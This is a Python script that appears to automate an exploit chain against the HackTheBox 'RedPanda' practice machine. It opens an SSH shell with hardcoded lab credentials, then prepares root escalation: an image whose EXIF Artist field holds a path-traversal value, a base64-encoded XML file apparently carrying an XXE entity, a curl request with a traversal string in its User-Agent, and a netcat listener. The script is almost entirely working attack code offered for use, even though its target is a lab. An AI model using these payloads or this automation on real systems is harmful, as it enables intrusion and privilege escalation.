import sys, os, requests, re, subprocess, paramiko
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-RedPanda
    __________________________________________________________________________\n"""
    print(Fore.BLUE + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] woodenk", "[+] root" , "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.11.170" # change this if change ip on htb.
client = paramiko.SSHClient()
host = target_machine
username = "woodenk"
password = "RedPandazRule"

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"http://{target_machine}/");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked woodenk Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")
        
#------------------------------------------------------------------------

def conection_woodenk():
    try:
        cm.sleep(.5)
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)
        try:
            shell = client.invoke_shell();cm.sleep(.5)
            while True:
                if shell.recv_ready():
                    output = shell.recv(1024).decode('utf-8')
                    print(output, end="")
                    
                command = input(f"{tmsg} ")
                if command.lower() in ["exit", "quit"]:
                    print("\n[!] Closing connection...")
                    break
                
                shell.send(command + "\n")
                cm.sleep(0.3)
                while shell.recv_ready():
                    output = shell.recv(1024).decode('utf-8')
                    print(output, end="")
            shell.close()
            client.close()
        except Exception as e:
            print(e)
    except paramiko.ssh_exception.NoValidConnectionsError:
        print(tmsg,Fore.YELLOW + f"[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")


def exploit_user_root():
    print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user Command (Victim Machine)] > " + Fore.LIGHTMAGENTA_EX + f"sudo rlwrap nc -nlvp 443")
    commands_send(f"wget http://{target_machine}:8080/img/smiley.jpg")
    commands_send("mv smiley.jpg pwned.jpg")
    commands_send("exiftool -Artist=../../../../../../tmp/pwn pwned.jpg")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user Command (Listen Http)] > " + Fore.LIGHTMAGENTA_EX + f"sudo python -m http.server 8080")
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [root-user] > " + Fore.WHITE + f"Press ENTER to continue...")
    commands_send("echo 'cj53b29kZW5rPC9hdXRob3I+CiAgPGltYWdlPgogICAgPHVyaT4meHhlOzwvdXJpPgogICAgPHZpZXdzPjE8L3ZpZXdzPgogIDwvaW1hZ2U+CiAgPGltYWdlPgogICAgPHVyaT4vaW1nL2h1bmd5LmpwZzwvdXJpPgogICAgPHZpZXdzPjA8L3ZpZXdzPgogIDwvaW1hZ2U+CiAgPGltYWdlPgogICAgPHVyaT4vaW1nL3Ntb29jaC5qcGc8L3VyaT4KICAgIDx2aWV3cz4wPC92aWV3cz4KICA8L2ltYWdlPgogIDxpbWFnZT4KICAgIDx1cmk+L2ltZy9zbWlsZXkuanBnPC91cmk+CiAgICA8dmlld3M+MDwvdmlld3M+CiAgPC9pbWFnZT4KICA8dG90YWx2aWV3cz4xPC90b3RhbHZpZXdzPgo8L2NyZWRpdHM+Cgo=' | base64 -d > pwned_creds.xml")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user Command (Victim Machine)] > " + Fore.LIGHTMAGENTA_EX + f"\n1. cd /tmp\n2. wget http://{machine_ip}:8080/pwned.jpg\n3. wget http://{machine_ip}:8080/pwned_creds.xml\n4. chmod 777 pwned_creds.xml\n5. watch -n 1 cat pwned_creds.xml")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user Command (Attack Machine)] > " + Fore.LIGHTMAGENTA_EX + f'curl -s -X get -A "prueba||/../../../../../../../../../tmp/pwned.jpg" {target_machine}:8080')


#------------------------------------------------------------------------

def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","woodenk connection"))
                conection_woodenk()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[woodenk] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","Root connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Root] > " + Fore.YELLOW + f"(Exploit) http://{target_machine}");cm.sleep(0.2)
                exploit_user_root()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Root] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
